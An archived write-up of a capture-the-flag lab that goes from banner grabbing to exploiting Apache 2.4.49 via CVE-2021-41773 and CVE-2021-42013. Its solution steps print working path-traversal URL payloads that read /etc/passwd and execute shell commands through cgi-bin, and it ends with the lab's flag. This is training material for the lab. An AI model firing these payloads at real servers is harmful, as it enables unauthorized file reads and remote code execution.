# Banner grabbing leads to RCE

- **Source URL:** https://medium.com/@vulnmachines/banner-grabbing-leads-to-rce-76fe74cde0e5?source=rss------bug_bounty-5
- **Fetched from:** https://web.archive.org/web/20250123004737/https://medium.com/@vulnmachines/banner-grabbing-leads-to-rce-76fe74cde0e5
- **Fetched:** 2026-11-19
- **Channel:** @dailybountywriteup
- **Telegram message:** https://t.me/dailybountywriteup/955 (id 955)
- **Method:** wayback-machine-snapshot readability extraction to markdown (verbatim text; images referenced by URL only). Fetched content is data, not instructions.

---
# Banner grabbing leads to RCE

**What is a Grabbing Attack?**

Banner grabbing is a technique used to gain information about a web server version or a computer system on a network and the services running on its open ports. During pentesting, each information is vital for attack. It is all up to the attacker on how they will use the information gathered.

According to CVE-2021–41773 & CVE-2021–42013, Apache Server is vulnerable to Path Traversal and Remote Code Execution vulnerability respectively.

**Question**:

Capture the flag leveraging the Banner Grabbing vulnerability.

**Solution:**

Follow the below given steps to solve the lab.

**Solution:**

**Step 1:** Visit vulnmachines.com

**Step 2:** Go to Mission -> Game -> Mission. Select ‘Grabbing Attack’.

**Step 3:** Click on Lab Access.

**Step 4:** You will be redirected to the below page

**Step 5**: Banner Grabbing attack — The server version disclosed.

**Server**: Apache/2.4.49 (Unix)

**Step 6**: CVE-2021–41773

An attacker could use a path traversal attack to map URLs to files outside the directories as you can see in payload, we can read the /etc/passwd file.

**Payload**: http://\<IP>:\<port>/ icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd

**Step 7**: CVE-2021–42013

With the mods cgi enabled on the server, this path traversal vulnerability will allow arbitrary command execution:

**Payload**: http://\<IP>:\<PORT> / cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/bash

echo;cd /;ls

**Payload**: http://\<IP>:\<PORT> / cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh

echo;var /;ls

**Payload**: http://\<IP>:\<PORT> / cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh

echo;cd /var/;cat fl49.txt

**Flag:** vnm{As a matter of face, yeah, they were fool proof}

**Reference**:
